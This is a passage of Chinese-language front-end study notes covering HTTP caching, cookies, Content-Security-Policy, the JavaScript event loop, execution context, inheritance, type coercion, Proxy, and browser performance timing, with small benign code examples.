must-revalidate）\n缓存的验证（Last-Modified（表示上次修改的时间），Etag（数据的唯一签名，如果资源发生改变，签名会发生改变））\nIf-Modified-Since：第二次访问该资源时，浏览器会向服务端发送一个请求，来确定该资源是否发生修改（重启服务器也会导致认为已经修改），如果没有修改则继续使用缓存（该请求的响应为304），如果已经修改了则重新对该资源的拉取\nIf-None-Match：当浏览器请求该资源时，服务端会发送一个Etag给浏览器，浏览器第二次请求该资源时，发送一个If-None-Match给服务端，让服务端来验证资源是否发送了改变\ncookie\ncookie通过Set-Cookie设置\ncookie是具备过期时间的，通过max-age来设置（表示该cookie存活多长时间后被销毁，单位秒），默认当浏览器销毁该会话时自动删除cookie，还可以设置expires来设置过期时间（指定该cookie到达什么时间后消耗，根据过期时间和本地客户端的时间进行对比，如果超过或者已经到了过期时间，就会销毁该cooki）\n设置httponly后无法通过document.cookie访问cookie（安全）\nsecure只在https时发送该cookie（安全）\nDomain只在命中该域时发送该cookie（安全）\npath可以限制服务端哪个路径下可以访问到该cookie（安全）\nconst http = require(\u0026quot;http\u0026quot;)\rhttp.createServer(function (_request, response) {\rresponse.writeHead(200,{\r'Content-Type': 'text/plain',\r'Set-Cookie': 'id=abc'\r// 'Set-Cookie': ['id=abc; max-age=5','pass=123; HttpOnly Secure=true','age=20; Domain=test.xiaochenabc123.test.com; path=/testWeb/']\r})\rresponse.end(\u0026quot;hallo nodejs\u0026quot;)\r}).listen(8888)\rconsole.log('Server running at http://127.0.0.1:8888/')\rhttp数据协商\nAccept（客户端想要的数据类型）\nAccept-Encoding（数据的编码传输，避免服务端进行数据编码压缩）\nAccept-Language（数据的语言）\nUser-Agent（浏览器的UA信息）\nContent-Type（服务端返回的数据的实质类型）\nContent-Encoding（服务端实质返回的数据的编码（实质的数据的压缩格式））\nContent-Language（服务端返回数据的实质语言）\nContent-Security-Policy（内容安全策略，CSP）\n限制资源的获取\nres.writeHead(200, {\r'Content-Type': 'text-html',\r'Content-Security-Policy': 'default-src http: https:' // 'Content-Security-Policy': 'default-src \\'self\\' http://test.xiaochenabc123.test.com; form-action \\'self\\'; report-uri https://testreport.xiaochenabc123.test.com; report-to reportTest' });\rdefault-src是全局限制，还有img-src，script-src，style-src等等限制指定的资源类型，上面的例子中表示的是限制全局资源必须是以http或者https的外联的方式访问，内联方式访问将会报错\n'self'的作用是非本域的资源，限制其加载，也可以设置指定的域的资源可以加载（注意：该限制不会导致form元素的action属性，需要使用form-action 'self'来限制）\nreport-uri的作用是当客户端存在违反CSP的企图是，将违规报告通过post请求的方式（json格式）发送指定服务器（该功能已被web标准抛弃，推荐使用取代品report-to）\nreport-to配置\nReport-To: { \u0026quot;group\u0026quot;: \u0026quot;reportTest\u0026quot;,\r\u0026quot;max_age\u0026quot;: 10886400,\r\u0026quot;endpoints\u0026quot;: [\r{ \u0026quot;url\u0026quot;: \u0026quot;https://reports.xiaochenabc123.test.com\u0026quot; },\r{ \u0026quot;url\u0026quot;: \u0026quot;https://test.xiaochenabc123.test.com/reports\u0026quot; }\r]\r},{ \u0026quot;group\u0026quot;: \u0026quot;reportTestA\u0026quot;,\r\u0026quot;max_age\u0026quot;: 10886400,\r\u0026quot;endpoints\u0026quot;: [\r{ \u0026quot;url\u0026quot;: \u0026quot;https://reportsA.xiaochenabc123.test.com\u0026quot; },\r{ \u0026quot;url\u0026quot;: \u0026quot;https://test.xiaochenabc123.test.com/reportsA\u0026quot; }\r]\r},\r当发生违规情况时，发送report报告到指定endpoints下的url中，group为report名，max_age是报告的最大大小是多少，可以设置多个report报告，report-to不支持在meta下使用\n如果发生违规情况，但是又不想强制限制资源的加载，只想记录违规情况的时候，可以使用Content-Security-Policy-Report-Only\n\u0026lt;meta http-equiv=\u0026quot;Content-Security-Policy\u0026quot; content=\u0026quot;default-src 'self' http://test.xiaochenabc123.test.com; form-action 'self'\u0026quot;\u0026gt;\r浏览器事件循环\n浏览器缓存\njson全成JavaScript Object Notation，用来数据交互，以键值对方式，多个数据用逗号分隔\njson支持字符串，数值，布尔值，数组，对象，null\nJSON.stringify() json转为字符串\nJSON.parse() 字符串转为json\nJSON字符串：和普通字符串没有区别，只是符合语法规则\n例如：\nlet objStr = '{\u0026quot;name\u0026quot;:\u0026quot;root\u0026quot;,\u0026quot;pass\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;true\u0026quot;: null}'\rlet objArr = '[{\u0026quot;name\u0026quot;: \u0026quot;boom\u0026quot;,\u0026quot;pass\u0026quot;: \u0026quot;hallo\u0026quot;},{\u0026quot;name\u0026quot;: \u0026quot;aaa\u0026quot;,\u0026quot;pass\u0026quot;: \u0026quot;yes\u0026quot;}]'\rlet obja = JSON.parse(objStr)\rlet objb = JSON.parse(objArr)\rconsole.log(obja)\rconsole.log(objb)\r获取属性和值\n通过对象名.属性名来获取或者修改，例如obja.name\n也可以通过对象名[属性名]来获取或者修改，例如obja[\u0026ldquo;name\u0026rdquo;]\n删除对象属性，delete obja.name\nJSON转JavaScript对象（利用eval()来解析json文本）\nlet objStr = '{\u0026quot;name\u0026quot;:\u0026quot;root\u0026quot;,\u0026quot;pass\u0026quot;:\u0026quot;admin\u0026quot;,\u0026quot;true\u0026quot;: null}'\rlet objArr = '[{\u0026quot;name\u0026quot;: \u0026quot;boom\u0026quot;,\u0026quot;pass\u0026quot;: \u0026quot;hallo\u0026quot;},{\u0026quot;name\u0026quot;: \u0026quot;aaa\u0026quot;,\u0026quot;pass\u0026quot;: \u0026quot;yes\u0026quot;}]'\rlet obja = eval(\u0026quot;(\u0026quot; + objStr + \u0026quot;)\u0026quot;)\rlet objb = eval(\u0026quot;(\u0026quot; + objArr + \u0026quot;)\u0026quot;)\rconsole.log(obja)\rconsole.log(objb)\rJSONP postMessage() websocket Node中间件代理 cors nginx反向代理 window.name + iframe location.hash + iframe document.domain + iframe\n执行上下文和执行栈（调用栈）\nJavaScript程序执行分2个阶段，预编译阶段和执行阶段，而执行上下文就是在执行阶段创建完成的\n预编译阶段主要做一些预处理工作，例如创建变量对象（变量提升），执行阶段就会激活这些变量对象（赋值）\n声明阶段会在编译时提升到最上面，当声明完成后，才会执行赋值操作，例如：\nvar a = 1\r上面会被编译器处理为\nvar a\ra = 1\r因此可以在编写时在未定义就使用该变量，改变编写时的位置（不再是从上往下依次执行），这就是变量提升\n函数声明可以被提升，而且函数表达式不会被提升，例如：\nabc()\rfunction abc(){\rconsole.log('hallo word')\r}\rxyz() // xyz is not a function，并不是这个不是函数，而且没有声明，因此这个没有得到提升\rvar xyz = function(){\rconsole.log('hallo hahaha')\r}\r只有声明本身被提升，赋值和其他操作并不会被提升，而且按照从上往下依次执行，提升只影响声明\n声明提升，函数优先，例如：\nabc() // hallo word\rvar abc\rabc = function(){\rconsole.log('hallo hahaha')\r}\rfunction abc(){\rconsole.log('hallo word')\r}\r可以看到abc变量最先出现，但是反而输出了hallo word，说明函数声明比变量声明提升的更早，变量abc因为重复声明，被忽略了\n执行上下文：指的是抽象化JavaScript代码执行的环境，当JavaScript代码被执行的时候，都是在执行上下文中运行的\n在JavaScript中有3种执行上下文，分别是全局执行，函数执行，Eval函数执行\n全局：不在函数内部的代码都在全局执行上下文中，一个程序只有一个全局执行上下文\n函数：当某个函数被调用时，为该函数创建一个函数执行上下文（如果被调用多次，会根据定义的顺序来执行（执行栈））\nEval函数：在eval函数内部执行的代码也有自己的执行上下文\n执行栈（调用栈）：指的是一种存在后进先出（LIFO）的数据结构的栈，该栈被用来存储程序运行的时候被创建的全部执行上下文。在JavaScript编译代码的时候，创建一个全局的执行上下文，将这个执行上下文存储在当前执行栈中，只要当碰到函数被调用，再为该函数创建一个新的执行上下文并且存储在栈的顶部，然后执行在顶部的函数，函数执行完毕，该执行上下文从栈中弹出，轮到下一个执行上下文进行，一旦全部代码都执行完毕，全局执行上下文弹出\n执行上下文会经历创建和执行俩个阶段，创建阶段会创建变量环境和词法环境，this绑定（在全局执行上下文中，this的值为全局对象，如果是浏览器的话，this为window对象，在函数执行上下文中，this取决于该函数怎么被调用的，如果是被一个对象调用的，那么this指向该对象，否则就是全局对象）\n词法环境：一种规范类型，用来定义变量名或者函数名和实际对象的关联，一个词法环境有两个组件，分别是环境记录器（用来存储变量和函数声明的实际位置），外部环境的引用（可以访问父级词法环境）\n词法环境有俩种类型：全局和函数，全局环境（全局执行上下文）是不存在有外部环境引用的，该环境拥有用户定义的全局变量，并且this执行全局对象。而在函数环境中，在函数内部定义的变量会被存储在环境记录器中，引用该环境的外部环境可能是全局，又或者是其他包含该函数的外部函数\n环境记录器也是有俩种，分别是声明式（函数环境）和对象式（全局环境），声明式会存储变量，函数以及参数（还会传递arguments（存储索引和参数映射）和length（函数参数））。而对象式被用来定义出现在全局上下文中的变量和函数之间的关系\n变量环境：在ES6中，只有使用var定义的变量才能使用变量环境来存储（let和const则是词法变量），在创建阶段，变量初始值为undefined（var）和未初始化（let和const）\nJS底层运行机制：EC/VO/AO/GO/EC/ECS/Scope/Scope Chain/Lexical Environment/Variable Environment\nJS执行环境（EC），变量对象（VO），活动对象（AO），GO对象，作用域（scope）作用域链（scope chain）\nJS执行环境（EC），EC全称为Execution Context，又叫执行上下文\n变量对象（VO），VO全称Variable Object，该对象存储了当前上下文中定义的变量和函数，在全局作用域中，变量对象就是全局对象\n活动对象（AO），AO全称Activation Object，该对象在进入函数执行上下文时被创建，AO对象存储了该函数的参数变量\nGO对象，GO全称Clobal Object，该对象存储了所有调属性和方法，并且在全局中创建一个window变量指向这个GO对象，因此GO对象实质上就是全局对象\nECS：ECS全称Execution Context Stack，就是执行上下文栈，又叫执行栈\nScope：作用域\nScope Chain：作用域链\nLexical Environment：词法环境\nVariable Environment：变量环境\n函数的运行：\n编译阶段：创建一个堆内存，声明当前函数的作用域，作用域和执行上下文相关，将函数内部语句块以字符串的形式存储在堆内存中，函数名指向该函数的堆内存地址\n执行阶段：创建函数执行上下文（私有），在函数执行上下文中存储活动对象（AO），初始化操作（初始化作用域链，this指向，arguments，形参赋值，变量提升），执行语句（调取堆内存中存储的字符串，以上下文的形式依次执行）\nScope Chain查找机制：检查在执行阶段的变量是否为私有变量，如果都是私有，那么直接操作私有，如果不是私有的，按照Scope Chain，向上级作用域查找，一直查找到全局作用域为止\n所谓的变量提升只是在编译阶段识别被创建的变量，在这个阶段中使用var和function定义的变量初始化的值被设置为undefined，而使用let和const定义的变量还是未初始化（暂时不能使用的状态），直到定义被执行才被初始化\nJavaScript是即时编译即时执行的机制，在执行一个函数之前，都会立刻编译该函数，然后创建执行上下文，在执行上下文中有个存储空间叫变量环境，这个环境存储着由var定义的变量，因为var定义的变量都在编译的时候已经存储了，在执行时的任何时间段都是可以访问调用的\n而使用const和let定义的变量，在编译完成的时候，执行之前，将变量名存储在词法环境中，在没有声明该变量之前是会存在暂时性死区（变量已经被上下文记录，但是不能使用）\nEventloop（事件循环）：事件循环实质上就是避免js单线程的时候出现堵塞，也是异步的原理\na programming construct that waits for and dispatches events or messages in a program.\nEvent Loop 任务分为两种，分别是宏任务（MacroTask）和微任务（MacroTask）\n所有同步任务会根据顺序被主线程依次执行，执行栈（execution context stack），而除主线程外，还有一个任务队列（task queue），当碰到异步任务完成了，任务队列就会告诉主线程，某个异步任务可以执行，这时这个异步任务才会进入主线程执行（异步任务结束等待，进入执行栈，开始执行），主线程反复操作，这就是事件循环\n宏任务：整体代码script，setTimeout和setInterval，I/O，UI Rendering（ui渲染），setImmediate（node的特性，浏览器已抛弃该API），requestAnimationFrame，事件\n微任务：Promise.then，process.nextTick（node的特性），MutationObserver\n在浏览器上：JavaScript会有一个主线程和执行栈（call-stack），全部任务都会放到执行栈等主线程执行\njs的执行栈是后进先出的数据结构，当某一个函数执行时，将插入到栈的顶部，当执行完毕，从栈顶部弹出。一直到栈被清空，执行栈的所有同步任务执行完成，开始查看任务队列，执行那些异步任务（只有当主线程空了，才能执行任务队列里面的）\n而任务队列是先进先出的数据结构，只有异步任务才能进入任务队列（同步任务在主线程上排队），异步任务必须指定回调函数，主线程执行异步任务实质上就是在执行对应的回调函数。当某个异步任务完成，就会向任务队列添加一个事件，在顶部的任务，会优先被主线程处理\n例如：\nnew Promise((a) =\u0026gt; a())\r.then(() =\u0026gt; console.log(\u0026quot;微任务1\u0026quot;))\r.then(() =\u0026gt; console.log(\u0026quot;微任务2\u0026quot;))\rconsole.log('hallo 我是同步任务1')\rvoid setTimeout(() =\u0026gt; {\rconsole.log(\u0026quot;我是定时任务1 宏任务\u0026quot;)\r}, 1000)\rvoid setTimeout(() =\u0026gt; {\rconsole.log(\u0026quot;我是定时任务2 宏任务\u0026quot;)\r}, 0)\rvoid setTimeout(() =\u0026gt; {\rconsole.log(\u0026quot;我是定时任务3 宏任务\u0026quot;)\r})\rsetTimeout(function() {\rconsole.log('我是宏任务，good bye')\r}, 1000)\rPromise.resolve()\r.then(() =\u0026gt; console.log(\u0026quot;微任务3\u0026quot;))\r.then(() =\u0026gt; console.log(\u0026quot;微任务4\u0026quot;))\r.then(() =\u0026gt; console.log(\u0026quot;微任务5\u0026quot;))\rconsole.log('hi 我是同步任务2')\r微任务列表是先进先出，先进入的，就先执行\n运行过程：同步任务执行（主线程），当同步任务为null，检查任务队列是否为null，不为null，宏任务（script任务）进入执行栈，在主线程执行前进行判断，（微任务和宏任务都是异步任务），如果微任务队列不为null（script任务执行过程中遇到微任务，将微任务添加到微任务排列），优先执行微任务，当微任务都执行完毕，执行下一个宏任务\nsetTimeout定时器最小延迟时间为4ms，在4ms以内的定时都将视为同一个最小延迟时间，将根据先进先出处理\n例如：\nsetTimeout(function() {\rconsole.log('hallo')\r}, 1)\rsetTimeout(function() {\rconsole.log('hhhh')\r}, 0)\rconsole.log('abcabc')\rsetTimeout()方法的返回值是整数，这个整数是该定时器的编号，可通过clearTimeout()方法来取消该定时器，例如clearTimeout(123)，假设该定时器编号为123\nDOM事件级别\nDOM0 函数赋值到一个事件中（可以绑定多个同类型事件），例如onclick=function(){}或者在元素内添加事件\nDOM2 使用监听，可以移除或者添加监听，例如addEventListener(\u0026lsquo;click\u0026rsquo;, test, false)\nDOM3 在DOM2级基础上添加更多事件类型，例如键盘事件addEventListener(\u0026lsquo;keyup\u0026rsquo;, test, false)\nDOM1因为没有定义事件相关的内容，所有没有DOM1级模型\n捕获（从祖先元素捕捉到子元素，精确到目标元素） 冒泡（从目标元素往上冒泡，一直到window元素）\n创建对象的方法\nlet a = {data: \u0026ldquo;hallo word!!!\u0026rdquo;} let b = new Object({data: \u0026ldquo;hallo word!!!\u0026rdquo;}) let c = function(){this.data=\u0026ldquo;hallo word!!!\u0026rdquo;} let d = new c() let e = Object.create(a)\n继承的方法\n通过原型链继承\nfunction test(){\rthis.data = 123\r}\rfunction main(){\rthis.type='main'\r}\rmain.prototype = new test() // main.prototype.__proto__ = test.prototype\rconsole.log(new main)\r缺点就是如果进行修改对象，那么其他通过其父类实例继承的对象，都会被修改(引用类型），而且也不能向父类构造函数传递参数\n通过构造函数继承\nfunction test(){\rthis.data = 123\r}\rfunction main(){\rtest.call(this)\rthis.type='main'\r}\rconsole.log(new main)\r实质上是通过改变test的this指向，将其指向到main，这个只能继承父类构造函数的属性，不能继承原型链上的方法（prototype）\n盗用构造函数（对象伪装/经典继承）\nfunction test(){\rthis.data = [123,666,\u0026quot;hahahah\u0026quot;]\r}\rfunction main(){\rtest.call(this)\r}\rlet a = new main()\rlet b = new main()\ra.data.push(\u0026quot;hallo word\u0026quot;)\rconsole.log(a,b)\r会发现a和b的data都是独享的，不会存在改变a，b也跟着改变，原理就是通过call改变this指向，指向当前的test，因为使用的call，还可以给父类传递参数，缺点就是无法复用父类方法，因为每次实例化，都要重新声明父类的方法\n组合继承（伪经典继承，将原型链和盗用构造函数方式结合）\n原理就是通过原型链继承父类的属性和方法，再用盗用构造函数继承实例的属性（可以确保方法可复用，每个实例都有自己的独享属性）\nfunction test(){\rthis.data = [123,666,\u0026quot;hahahah\u0026quot;]\r}\rfunction main(){\rtest.call(this)\r}\rmain.prototype = new test()\rlet a = new main()\rlet b = new main()\ra.data.push(\u0026quot;hallo word\u0026quot;)\rconsole.log(a,b)\r通过盗用构造函数继承父类的data属性，然后通过原型链，继承父类的原型对象\n缺点就是会调用2次test构造函数（分别是在new，call各调用一次），而且实例和原型都存在相同的属性和方法\n原型式继承（实例继承）（直接给对象赋值给构造函数的原型）\nfunction test(data){\rfunction hallo(){}\rhallo.prototype = data\rreturn new hallo()\r}\r寄生式继承\nfunction test(data){\rlet hallo = Object.create(data)\rhallo.abc = function(){\rconsole.log(this.name+this.pass)\r}\rreturn hallo\r}\rlet data1 = {\rname:\u0026quot;root\u0026quot;,\rpass:\u0026quot;hallo\u0026quot;\r}\rlet main = test(data1)\rmain.abc()\r通过接收参数，该参数为被继承的对象，main是基于data1对象创建一个新对象，这个对象有data1的属性和方法，也有自己的abc方法，继承父类之后，进行增强了\n寄生式组合继承（组合继承加寄生式继承）\nfunction test() {\rthis.data = [123,666,\u0026quot;hahahah\u0026quot;]\r}\rfunction main() {\rtest.call(this)\r}\rmain.prototype = Object.create(test)\rlet a = new main()\rlet b = new main()\ra.data.push(\u0026quot;hallo word\u0026quot;)\rconsole.log(a,b)\rextends继承（es6继承，通过extends关键字继承）\nclass test {\rconstructor(name=\u0026quot;root\u0026quot;,data=\u0026quot;hallo\u0026quot;) {\rthis.name = name\rthis.data = data\r}\rhallo(){\rconsole.log(`${this.name} ${this.data}`)\r}\r}\rclass main extends test {\rconstructor(name=\u0026quot;admin\u0026quot;,data=\u0026quot;hahaha\u0026quot;) {\rsuper(name,data)\r}\rhallo(){\rsuper.hallo()\r}\r}\rlet abc=new main('user')\rabc.hallo()\r通过extends关键字创建父类的实例this，然后在子类class中修改this，必须通过父类构造函数来得到父类的属性和方法（super方法）\n浏览器缓存的分类\n强缓存（本地缓存，不用请求，直接拿来用）， expires和control\nexpires是http1.0定义的缓存字段，expires字段为资源的过期时间，这个字段是时间戳，这个会导致客户端时间和服务端时间之间时间差问题（因为请求的时候使用的客户端的事件）\ncontrol（cache-control）是http1.1中定义的字段，用来解决expires存在的问题，该字段是一个时间长度，表示多少秒后过期（相对于客户端），当expires和cache-control都存在时，cache-control优先级高\n协商缓存（当拿到该缓存，会向服务端进行确认，确认其是否要用，缓存有没有更新），last-modified和etag\nlast-modified会在获取到某资源的时候记录资源的修改时间，当第二次获取到的时候，会对比时间，精确到秒（1秒内的更新，不会被记录），如果对比修改时间，发现没有修改，那么继续使用该缓存并且返回304，如果被修改那么重新获取，并且记录新时间，而且存在时间上修改了，但是内容没有修改的问题，etag就是解决这个的\netag会基于内容编码生成唯一的标识，只要内容不一样，标识就一定不一样，判断是否被修改，直接判断标识是否一致，一致则直接使用缓存并且返回304，不一致就是获取新的缓存，并且记录etag值\n因为JavaScript没有类型声明，可以进行类型的强制转换，手动转换（明确转换）的叫显式转换类型，自动转换（隐式，由编译器自动处理）的叫隐式转换类型\nObject.prototype.toString()返回表示该对象的字符串\nObject.prototype.valueOf()返回对象的原始值\nSymbol.toPrimitive效果和valueOf()类似，只是优先级比valueOf()高，并且接受一个hint参数（该参数被用来指定要转换的原始值的具体类型）\n隐式转换过程：优先调用对象的valueOf()方法，返回原始值，如果不能处理则调用对象的toString()方法转换为字符串，进行字符串拼接，否则报错（cannot convert object to primitive value）\n隐式类型转换例子：\ntrue + 1 === 2 // true\r布尔值加整数，居然绝对等于（类型和值都等于）一个整数，这说明类型已经被转换了\n+加号不但可以用来算术运算，还可以做字符串拼接\n字符串加数字，数字自动转字符串\n\u0026quot;123\u0026quot; + 666 // '123666'\r数字减字符串，字符串自动转数字，如果字符串不是纯数字，那么输出为NaN\n123 - \u0026quot;100\u0026quot; // 23\r相等\n==，当类型不相同时，进行类型转换，再进行比较\n===，首先进行判断类型是否相同\nundefined==null // true\r\u0026quot;0\u0026quot; == false // true\r比较\n\u0026quot;3\u0026quot; \u0026gt; \u0026quot;10\u0026quot; // true\r字符串和字符串比较就算了，为啥字符串3大于字符串10，类型转换了也不应该啊\n实质上并没有做类型的转换，因为其比较的时候调用了charCodeAt()方法，返回值是整数，这个整数表示则该字符的Unicode编码\n所以实质上是\u0026quot;3\u0026quot;.charCodeAt() \u0026gt; \u0026ldquo;10\u0026rdquo;.charCodeAt()\n表示\u0026quot;3\u0026quot;的Unicode编码为51，\u0026ldquo;10\u0026quot;的为49\ncharCodeAt()方法可以将字符串转Unicode编码，该方法必须要写index参数，如果没写默认参数值为0\nlet abc = \u0026quot;你好\u0026quot;\rconsole.log(abc.charCodeAt(1)) // 22909 该值为\u0026quot;好\u0026quot;的Unicode编码\r同样也可以将Unicode编码转字符串fromCharCode()方法\nlet a = String.fromCharCode(51)\rconsole.log(a) // 3\rconsole.log(typeof(a)) // 'string'\rproxy对象属于一种元编程（meta programming），proxy可以拦截对象，外部进行调用该对象时，必须通过这个拦截，这个拦截器可以对外部的调用进行过滤和查找赋值等等，另外Vue3.0的数据双向绑定（响应式）实现原理就是proxy\nES6提供了Proxy构造函数，来new Proxy()实例，Proxy实例具备有2个参数，分别是target, handler\nlet proxy = new Proxy(target, handler)\ntarget参数是要拦截的对象，handler参数为拦截后的行为（也是对象）\nProxy支持13种拦截行为，分别是：\nget()：读取属性\nset()：修改属性\nhas()：in操作符，判断某个属性是否存在于这个对象之中\napply()：当Proxy拦截函数时\nconstruct()：当使用new关键字时\ndeleteProperty()：当使用delete删除对象的属性时\ndefineProperty()：当使用Object.defineProperty修改属性修饰符时\nownKeys()：当使用Object.getOwnPropertyNames()，Object.getOwnPropertySymbols()，Object.keys()，Reflect.ownKeys()获取对象的信息时\ngetPrototypeOf()：当使用Object.getPrototypeOf()读取对象的原型信息时\nsetPrototypeOf()：当使用Object.setPrototypeOf()设置对象的原型时\nisExtensible()：当使用Object.isExtensible()判断对象是否可以添加新的属性时（Reflect.isExtensible()操作也会触发）\npreventExtensions()：当使用Object.preventExtensions()设置对象不能添加新的属性时\ngetOwnPropertyDescriptor()：当使用Object.getOwnPropertyDescriptor()获取该对象的自有属性（自有属性指该对象所有，不需要通过原型链获取该属性）的属性描述时\n这里只写最常用的get()和set()\nconst abc = {\rname: \u0026quot;chenjunlin\u0026quot;,\rpass: \u0026quot;123456789\u0026quot;\r}\rconst proxy1 = new Proxy(abc, {\rget(target, property, receiver) {\rif (property in target){\rreturn target[property]\r}else{\rreturn '读取失败'\r}\r},\rset(target, property, value, receiver){\rtarget[property] = value\rconsole.log(`${property}属性被设置值`, value)\r}\r})\rconsole.log(proxy1.name)\rconsole.log(proxy1.pass)\rconsole.log(proxy1.hallo)\rproxy1.name = \u0026quot;root\u0026quot;\rconsole.log(proxy1.name)\rproxy1.pass = \u0026quot;123\u0026quot;\rconsole.log(proxy1.pass)\rtarget是拦截对象，property是被拦截获取到的属性，value是新的属性值，receiver是Proxy对象本身（指向this对象，如果是继承的，那么该值为继承的Proxy对象）\nReflect是提供拦截对象操作的方法，其不是构造函数，不可通过new创建和调用Reflect，其拦截的方法和Proxy相同\n例如：\nconst obj = {\rname: \u0026quot;root\u0026quot;,\rpass: \u0026quot;123\u0026quot;\r}\rReflect.get(obj, \u0026quot;name\u0026quot;)\rBabel编译工作\nBabel的核心功能就是编译ESNext，进行降级，保证兼容性，编译的核心就是通过AST（语法抽象树）对源码进行分析，并且转换为目标代码，解析成AST是方便计算机理解源码是干什么的，而Babel解析器是Babylon\n像解析let const时，直接转换为var，并且判断编译阶段的const是否存在二次赋值，如果存在就是报错，块级作用域通过立即调用函数实现（例如匿名函数），针对暂时性死区，使用JavaScript严格模式实现\n前端性能指标\n首次绘制时间（FP）：页面发生第一次绘制时间，首次不同于上次跳转之间的内容\n首次有内容绘制时间（FCP）：浏览器渲染完成DOM的部分内容（可以是文本，也是可以是其他带内容的（或者说有视觉效果的））的时间\n首次有意义绘制时间（FMP）：页面关键内容的绘制时间（根据不同需求而定）\n首屏时间：完成整个屏幕内容渲染的时间（不包括滚动）\n用户可交互时间：用户可与页面进行交互的时间，DOMReady（html元素转换为DOM树完成（DOMContentLoaded事件），不包括加载外部文件）\n视觉稳定性指标（CLS，Cumulative Layout Shift）：指页面从一帧到另一帧时，不稳定元素的偏移量（也叫布局偏移量）\nFID（First Input Delay，首次输入延迟）\nPSI（Perceptual Speed Index，视觉变化率）\nFPS（Frames Per Second，每秒显示帧数）\n白屏时间：从页面发送刷新或者跳转后到页面出现第一个字符的时间\n白屏时间FP = domLoading - navigationStart\n可能导致白屏时间过长的原因：dns查询，tcp请求连接，服务端响应速度，关键资源下载，解析，渲染，资源体积\n首屏时间（服务端渲染应用用DOMContentLoaded时间，客户端渲染应用MutationObserver）：白屏时间加渲染时间\nMutationObserver接口可以监视DOM元素，因为客户端渲染应用是在客户端通过ajax请求的方式进行显示内容的，DOMContentLoaded时间并不能实质表示客户端渲染应用的首屏时间，应该监听某个最后的DOM元素，当其加载完成了，这个时间才算首屏时间，当然MutationObserver并不能计算图片加载时间，因为图片加载是异步的\n首屏时间数据：平均值，分位值（例如P99，将全部首屏时间排序，第99位的首屏时间就是P99，除了P99，还有P50,P90）,秒开率（1秒内打开的用户的比率，还有1.5秒开率，2秒开率）\n首屏时间优化：懒加载（加载关键内容，延迟加载其他内容，按需加载），缓存（减少重复请求），离线化，请求并行化（域名散列或者HTTP2.0多路复用）\nDNS查询优化：浏览器提供预获取DNS接口，可在浏览器建立DNS缓存，减少DNS查询所耗费的时间\nDNS查询优先级：浏览器缓存\u0026gt;hosts\u0026gt;路由器缓存\u0026gt;DNS服务器缓存（ISP）\u0026gt;根服务器缓存\nChrome浏览器默认缓存60秒，如果之间访问过了该域名，那么在60秒内将不会重新获取DNS缓存，而是直接调用浏览器的DNS缓存，减少DNS查询耗费的时间\n开启DNS预解析\n尝试对a.xiaochenabc123.test.com域名做预解析（不能用来对当前域名做预解析，因为当得到这个资源时，早就得到当前域名的解析IP）\n预连接\n预加载（会提升该资源加载的优先级，加载和执行是不同的，加载完成并不会执行，需要手动执行）\n预判加载（会降低该资源加载的优先级，因此只有当空闲时才会加载这个）\nHTTP请求优化：解决请求阻塞（请求阻塞（Stalled）是浏览器为了确保访问速度，对同一域名下的资源限制在一定的请求数，超过该请求数就会阻塞）\n以目前版本的Chrome浏览器来说，其最大请求数是6个（http1.1），超过6个请求数时，只能等待前面的请求后再进行请求，请求阻塞只针对同一域下的，只需要将资源用不同的域名散列（实质请求数限制将表示为域名数 * 浏览器最大请求数）\n例如将某个静态资源服务器，分成多个域名，例如，a.xiaochenabc123.test.com，b.xiaochenabc123.test.com，那么请求数就是可以达到12个\n资源Gzip压缩，避免301和302重定向，骨架屏\n性能数据获取\nwindow.performance\nconst TimeData= window.performance\rTimeData.memory // 该字段表示JavaScript对内存的占用\rconsole.log(TimeData.memory)\rmemory字段有三个属性（这些属性都是只读的，而且只有Chrome内核的浏览器才有这些属性，是非标准），分别是jsHeapSizeLimit（内存大小的限制），totalJSHeapSize（可以使用的内存），usedJSHeapSize（JavaScript对象占用的内存（包括V8内部对象））\nconsole.log(TimeData.navigation)\rnavigation字段有两个属性，分别是redirectCount（获取某个资源需要重定向几次才能得到）和type（该属性有4个值，0表示是通过正常访问的（TYPE_NAVIGATENEXT），1表示通过刷新访问的（TYPE_RELOAD ），2表示通过前进后退按钮访问的（TYPE_BACK_FORWARD，历史记录），255表示不是这些方式之外访问的（TYPE_UNDEFINED））\ntimeOrigin字段\nconst datea = new Date(TimeData.timeOrigin)\rconsole.log(datea)\rconsole.log(TimeData.timeOrigin)\r返回性能测量开始时的高精度时间戳\ntiming字段虽然已被w3c标准抛弃，但是这玩意的接口很强大\nconsole.log(TimeData.timing)\r可以看到输出了21个属性，这些属性分别是\nconnectEnd: http连接成功的时间（建立连接） connectStart: http开始建立连接的时间（开始连接） domComplete: dom解析完毕的时间，资源也准备就绪（Document.readyState值为complete） domContentLoadedEventEnd: DOMContentLoad事件结束时间，dom解析完毕，并且资源加载完毕 domContentLoadedEventStart: DOMContentLoad事件开始时间，dom解析完毕，开始加载资源 domInteractive: 解析html文档，dom树创建完毕的时间，资源还没加载（Document.readyState值为interactive） domLoading: 开始解析渲染dom树的时间（Document.readyState值为loading） domainLookupEnd: DNS查询域名结束时间（当使用了本地缓存时或者持久连接，不需要dns查询，该值等于fetchStart的值） domainLookupStart: DNS查询域名开始时间（当使用了本地缓存时或者持久连接，不需要dns查询，该值等于fetchStart的值） fetchStart: 浏览器准备发起第一个资源请求的时间（检查缓存之前） loadEventEnd: load事件结束的时间 loadEventStart: load事件开始时间 navigationStart: 前一个页面的unload时间（当前窗口的前一个页面的关闭并且发生unload事件时），如果没有前一个页面，则表示fetchStart时间 redirectEnd: 最后一个http重定向发生时的时间 redirectStart: 第一个http重定向发生时的时间 requestStart: http连接完成并且请求真实文档的时间 responseEnd: http返回响应并且全部接收完成的时间（接收最后一个字节） responseStart: http开始接收响应的时间（接收第一个字节） secureConnectionStart: http连接开始的时间（和connectEnd类似），如果不是安全连接返回0 unloadEventEnd: 前一个页面中的unload事件所绑定的回调函数执行完毕的时间 unloadEventStart: 前一个页面中的unload事件触发的时间，如果没有前一个页面或者前一个页面和当前页面不在一个域中时，返回0\n单位： Unix毫秒时间戳（基于UTC1970.01.01 00:00:00到现在的总毫秒数）\n重定向时间：redirectEnd - redirectStart\ndns查询时间：domainLookupEnd - domainLookupStart\ntcp建立连接并且完成握手时间：connectEnd - connectStart\n内容加载完成时间：responseEnd - requestStart\nDNS缓存时间：domainLookupStart - fetchStart\n卸载页面的时间: unloadEventEnd - unloadEventStart\nrequest请求耗费时间（重定向）：redirectEnd - redirectStart\n解析DOM树耗费的时间：domComplete - responseEnd\n白屏时间：domLoading - fetchStart\n用户可交互时间：domContentLoadedEventEnd - 